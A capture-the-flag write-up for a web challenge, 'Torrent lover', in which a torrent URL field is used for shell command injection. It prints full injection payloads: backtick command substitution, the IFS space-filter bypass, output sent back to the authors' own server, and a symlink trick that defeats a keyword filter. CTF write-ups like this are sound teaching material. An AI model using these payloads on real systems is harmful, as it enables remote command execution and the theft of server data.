Torrent_lover 
------------------------

Torrent lover is a web problem. Accessing the page, we see a textbox asking us to point to a torrent. We create a torrent file and upload it and it gives us a link to check the output, which lists the recently uploaded torrents. We notice that the server gets the values of the torrent file. 

We confirm this by hosting a torrent file and pointing the server to it. We see a query from the server. After playing with some inputs, we notice that the input accepted must end with .torrent. However, anything after a space or ';' is ignored. This makes us think that it may possibly be a call from a shell.

Perhaps, something like the following. 
<code>
output = system("curl ...our_input");
</code>


[ Note output is ommitted since the servers are not up after CTF and we cant reproduce it ]

We do a simple test with the string

"http://our_server/$PATH.torrent"

And we notice that our server gets the request with the actual path of the server. 


Great! So let's try running some commands, 

<pre><code>
http%3A%2F%2Funix1.andrew.cmu.edu%3A8000%2F`ls`.php%0aa.torrent
</code></pre>

We notice that we get some output, but we only get the first part of the output that is before a space! However, we are also limited as we can't have an input with spaces between them, so we use the IFS trick! And to get all the outputs from the server, we use 'tr' to replace the whitespace in the output with a delimeter:

<pre><code>
http%3A%2F%2Funix1.andrew.cmu.edu%3A8000%2F`IFS=+;a=ls+-l;ta1=tr+'\t'+'?';ta2=tr+'\n'+'?';ta3=tr+'\40'+'?';$a|$ta1|$ta2|$ta3`.php%0aa.torrent
</code></pre>

After browsing around, we realized that in the directory /var/www we have a directory called flag, that contains a binary use_me_to_read_flag (owner flag and setuid), and a file flag.txt which is readonly by a user flag. We run use_me_to_read_flag and notice that the usage is ./use_me_to_read_flag [file]. We then try

<pre><code>
url=http%3A%2F%2Funix1.andrew.cmu.edu%3A8000%2F`IFS=+;a=../flag/use_me_to_read_flag+../flag/flag;ta1=tr+'\t'+'?';ta2=tr+'\n'+'?';ta3=tr+'\40'+'?';$a|$ta1|$ta2|$ta3`.php%0aa.torrent
</code></pre>

However, it gives us an error that we can't read the file... We try several inputs and realize that it only gives us an error if the input has the word 'flag' in it. 

Therefore, we get around this by creating a symbolic link and running the binary on it.

<pre><code>
url=http%3A%2F%2Funix1.andrew.cmu.edu%3A8000%2F`IFS=+;csym=ln+-s+/var/www/flag/flag+/var/www/work/zhongzi/mytorrz;a=ls+-l+/var/www/work/zhongzi/my*;ta1=tr+'\t'+'_';ta2=tr+'\n'+'_';ta3=tr+'\40'+'_';$csym;$a|$ta1|$ta2|$ta3`.php%0aa.torrent
</code></pre>


And we run the file:

<pre><code>
url=http%3A%2F%2Funix1.andrew.cmu.edu%3A8000%2F`IFS=+;a=../flag/use_me_to_read_flag+/var/www/work/zhongzi/mytorrz;ta1=tr+'\t'+'?';ta2=tr+'\n'+'?';ta3=tr+'\40'+'?';$a|$ta1|$ta2|$ta3`.php%0aa.torrent
</code></pre>


and we get the flag!